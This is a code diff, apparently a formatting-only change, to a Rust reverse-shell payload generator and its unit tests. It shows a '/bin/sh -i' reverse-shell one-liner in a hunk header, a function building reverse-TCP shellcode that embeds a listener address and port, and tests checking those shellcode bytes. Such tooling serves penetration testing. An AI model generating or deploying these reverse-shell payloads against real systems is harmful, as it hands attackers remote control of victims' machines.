@@ -319,7 +319,9 @@ exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
             // a defensive fallback that never silently drops the endpoint.
             match reverse_tcp_shellcode(lhost, lport) {
                 Some(code) => code,
-                None => format!("[error: tcp shellcode requires a numeric IPv4 lhost; got {lhost}]"),
+                None => {
+                    format!("[error: tcp shellcode requires a numeric IPv4 lhost; got {lhost}]")
+                }
             }
         }
         ShellType::ReverseHttp | ShellType::ReverseHttps => {
@@ -721,7 +723,9 @@ mod tests {
         // 192.168.1.7:4444 → port bytes 11 5c (BE), address bytes c0 a8 01 07.
         let payload = generate_reverse_shell(ShellType::ReverseTcp, "192.168.1.7", 4444);
         assert!(
-            payload.payload.contains("\\x48\\xb9\\x02\\x00\\x11\\x5c\\xc0\\xa8\\x01\\x07"),
+            payload
+                .payload
+                .contains("\\x48\\xb9\\x02\\x00\\x11\\x5c\\xc0\\xa8\\x01\\x07"),
             "shellcode must embed the sockaddr (family, port BE, address NBO): {}",
             payload.payload
         );
@@ -736,14 +740,19 @@ mod tests {
         let second = generate_reverse_shell(ShellType::ReverseTcp, "10.0.0.2", 4444).payload;
         assert_ne!(first, second, "payload must vary with lhost and lport");
         assert!(first.contains("\\x27\\x0f"), "9999 = 0x270f (BE)");
-        assert!(!first.contains("\\x11\\x5c"), "must not contain 4444 = 0x115c");
+        assert!(
+            !first.contains("\\x11\\x5c"),
+            "must not contain 4444 = 0x115c"
+        );
     }
 
     #[test]
     fn test_generate_reverse_tcp_invalid_lhost_is_loud_not_silent() {
         let payload = generate_reverse_shell(ShellType::ReverseTcp, "myhost.example", 4444);
         assert!(
-            payload.payload.contains("[error: tcp shellcode requires a numeric IPv4 lhost"),
+            payload
+                .payload
+                .contains("[error: tcp shellcode requires a numeric IPv4 lhost"),
             "invalid lhost must produce a diagnostic, not a silent broken stub"
         );
     }
